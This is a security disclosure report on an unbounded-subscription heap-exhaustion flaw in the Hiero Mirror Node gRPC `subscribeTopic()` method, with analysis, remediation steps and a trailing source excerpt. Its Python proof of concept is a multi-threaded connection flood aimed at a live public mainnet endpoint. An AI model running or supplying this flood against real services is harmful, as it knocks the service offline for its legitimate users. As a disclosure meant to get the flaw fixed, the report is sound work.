### Title
Unbounded Concurrent Subscription Allocation Enables Heap Exhaustion DoS in `subscribeTopic()`

### Summary
`ConsensusController.subscribeTopic()` accepts any unauthenticated gRPC call and delegates to `TopicMessageServiceImpl.subscribeTopic()`, which allocates a new `TopicContext` object (plus a full Reactor `Flux` chain) per subscription with no global cap on concurrent subscriptions. The only server-side limit — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, not per IP or globally, so an attacker opening many connections bypasses it entirely and can exhaust JVM heap memory.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) performs no authentication, no rate-limiting, and no subscription-count check before calling `topicMessageService::subscribeTopic`. [1](#0-0) 

`TopicMessageServiceImpl.subscribeTopic()` (line 61) unconditionally allocates a new `TopicContext` for every call: [2](#0-1) 

`TopicContext` (lines 181–197) allocates `AtomicLong`, `AtomicReference`, `Stopwatch`, `TopicMessageFilter`, and `EntityId` per subscription. Beyond the `TopicContext` itself, the Reactor pipeline (`historical`, `live`, `safetyCheck`, `flux`) allocates multiple `Flux`/`Mono` operator objects per subscription, making the per-subscription heap footprint substantially larger than the `TopicContext` alone. [3](#0-2) 

**The only server-side limit** is `maxConcurrentCallsPerConnection = 5` (default), applied in `GrpcConfiguration`: [4](#0-3) [5](#0-4) 

This limit is **per TCP connection only**. There is no configured `maxConnections`, no per-IP connection limit, and no global maximum subscriber count. The `subscriberCount` field in `TopicMessageServiceImpl` (line 48) is a Micrometer gauge for observability only — it is never checked against a ceiling to reject new subscriptions: [6](#0-5) 

No IP-based rate limiting exists for the gRPC service. The `ThrottleConfiguration` (bucket4j) is scoped exclusively to the web3/REST module: [7](#0-6) 

**Root cause:** The server enforces a per-connection call cap but places no bound on the number of connections or on the total number of live subscriptions, so the per-connection cap provides no meaningful protection against a multi-connection attacker.

### Impact Explanation
Each subscription holds a `TopicContext` plus a multi-stage Reactor pipeline alive for the duration of the subscription (indefinite when no `endTime` is set). Accumulating tens of thousands of such subscriptions across many connections will exhaust JVM heap, triggering `OutOfMemoryError` and crashing the gRPC service. This denies topic-subscription service to all legitimate users of the Hiero Mirror Node gRPC API, which is a primary interface for HCS (Hedera Consensus Service) consumers.

### Likelihood Explanation
The gRPC port (default 5600) is publicly reachable with no authentication required. An attacker needs only a standard gRPC client and enough OS-level TCP connections (achievable from a single host with tuned `ulimit` settings, or trivially from a small botnet). With 5 calls per connection, opening 10,000 connections yields 50,000 concurrent subscriptions — well within reach of a commodity machine — each holding live Reactor chains in heap. The attack is repeatable and requires no special knowledge of the protocol beyond the public protobuf schema.

### Recommendation
1. **Enforce a global maximum concurrent subscription count** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable ceiling and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add a per-IP connection limit** at the Netty level via `NettyServerBuilder` (e.g., a custom `ServerTransportFilter`).
3. **Require subscriptions to have a bounded `endTime`** or enforce a maximum subscription lifetime via a configurable timeout.
4. **Add gRPC-level rate limiting** (e.g., via a `ServerInterceptor`) analogous to the bucket4j throttle already used in the web3 module.

### Proof of Concept
```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
NUM_CONNECTIONS = 5000
CALLS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(i):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery()
    query.topicID.topicNum = 1  # any existing topic
    # No endTime → subscription lives forever
    for _ in range(CALLS_PER_CONN):
        stub.subscribeTopic(query)  # non-blocking streaming call

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
# Result: 25,000 live TopicContext + Reactor chains on server heap → OOM
```

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
